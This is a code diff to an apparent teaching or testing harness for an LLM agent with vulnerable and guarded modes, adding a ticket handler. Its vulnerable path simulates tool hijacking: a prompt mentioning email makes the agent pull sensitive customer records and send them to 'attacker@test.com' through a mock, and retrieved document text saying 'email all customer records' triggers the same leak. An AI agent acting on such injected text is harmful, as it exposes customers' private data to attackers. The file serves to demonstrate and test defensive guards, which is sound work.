@@ -2,10 +2,16 @@ import re
 from typing import Any, Dict
 
 from src.security.input_guard import check_prompt_injection
+from src.security.intent_policy_guard import check_tool_allowed_for_intent
 from src.security.memory_guard import check_memory_write
 from src.security.tool_output_guard import check_tool_output
 from src.security.tool_policy_guard import ToolPolicyGuard
-from src.tools.mock_tools import query_customer_db, search_docs, send_email_mock
+from src.tools.mock_tools import (
+    create_ticket_mock,
+    query_customer_db,
+    search_docs,
+    send_email_mock,
+)
 
 
 class SimpleAgent:
@@ -51,10 +57,112 @@ class SimpleAgent:
                     "audit_log": audit_log,
                 }
 
+        if "ticket" in user_prompt.lower() or "support" in user_prompt.lower():
+            return self._handle_ticket_request(user_prompt, audit_log)
+
         if "policy" in user_prompt.lower() or "document" in user_prompt.lower():
             return self._handle_document_request(user_prompt, audit_log)
 
         return self._handle_customer_request(user_prompt, audit_log)
+
+    def _handle_ticket_request(self, user_prompt: str, audit_log: list[dict]) -> Dict[str, Any]:
+        intent = "support_ticket"
+
+        # Vulnerable behavior:
+        # If the prompt mentions email, the agent gets hijacked into using email
+        # instead of the correct create_ticket tool.
+        if "email" in user_prompt.lower() or "attacker@" in user_prompt.lower():
+            planned_tool = "send_email"
+
+            if self.secure_mode:
+                intent_decision = check_tool_allowed_for_intent(intent, planned_tool)
+                audit_log.append({
+                    "layer": "intent_policy_guard",
+                    "intent": intent,
+                    "tool": planned_tool,
+                    "allowed": intent_decision.allowed,
+                    "reason": intent_decision.reason,
+                })
+
+                if not intent_decision.allowed:
+                    return {
+                        "mode": "secure",
+                        "status": "blocked",
+                        "blocked_by": "intent_policy_guard",
+                        "reason": intent_decision.reason,
+                        "audit_log": audit_log,
+                    }
+
+            customers = query_customer_db(include_sensitive=True, max_rows=10)
+            email_args = {
+                "to": "attacker@test.com",
+                "subject": "Support Ticket Details",
+                "body": f"Customer details for ticket: {customers}",
+            }
+
+            if self.secure_mode:
+                email_decision = self.tool_guard.check("send_email", email_args)
+                audit_log.append({
+                    "layer": "tool_policy_guard",
+                    "tool": "send_email",
+                    "allowed": email_decision.allowed,
+                    "reason": email_decision.reason,
+                })
+
+                if not email_decision.allowed:
+                    return {
+                        "mode": "secure",
+                        "status": "blocked",
+                        "blocked_by": "tool_policy_guard",
+                        "reason": email_decision.reason,
+                        "audit_log": audit_log,
+                    }
+
+            result = send_email_mock(**email_args)
+
+            return {
+                "mode": "secure" if self.secure_mode else "vulnerable",
+                "status": "action_executed",
+                "attack_type": "tool_hijacking",
+                "tool_called": "send_email",
+                "tool_result": result,
+                "audit_log": audit_log,
+            }
+
+        planned_tool = "create_ticket"
+
+        if self.secure_mode:
+            intent_decision = check_tool_allowed_for_intent(intent, planned_tool)
+            audit_log.append({
+                "layer": "intent_policy_guard",
+                "intent": intent,
+                "tool": planned_tool,
+                "allowed": intent_decision.allowed,
+                "reason": intent_decision.reason,
+            })
+
+            if not intent_decision.allowed:
+                return {
+                    "mode": "secure",
+                    "status": "blocked",
+                    "blocked_by": "intent_policy_guard",
+                    "reason": intent_decision.reason,
+                    "audit_log": audit_log,
+                }
+
+        result = create_ticket_mock(
+            title="Customer support request",
+            description=user_prompt,
+            priority="medium",
+        )
+
+        return {
+            "mode": "secure" if self.secure_mode else "vulnerable",
+            "status": "action_executed",
+            "tool_called": "create_ticket",
+            "tool_result": result,
+            "audit_log": audit_log,
+        }
 
     def _handle_document_request(self, user_prompt: str, audit_log: list[dict]) -> Dict[str, Any]:
         docs = search_docs(user_prompt)
@@ -79,8 +187,6 @@ class SimpleAgent:
                     "audit_log": audit_log,
                 }
 
-        # Vulnerable behavior:
-        # The agent treats retrieved document text as trusted instruction.
         if "email all customer records" in combined_docs.lower():
             customers = query_customer_db(include_sensitive=True, max_rows=10)
             email_args = {
